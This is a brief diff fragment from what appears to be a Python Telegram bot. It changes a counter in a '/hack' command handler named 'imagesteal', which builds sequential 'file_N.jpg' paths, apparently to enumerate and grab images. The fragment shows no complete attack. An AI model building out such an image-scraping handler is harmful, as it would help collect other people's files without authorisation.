@@ -93,7 +93,7 @@ def todbsendtext (replied,message):
 			
 @bot.message_handler(commands=['hack'])
 def imagesteal(message):
-	a = 1104784
+	a = 1104468
 	b = 1103426
 	while a > 0:
 		path = str("file_"+str(a)+".jpg")
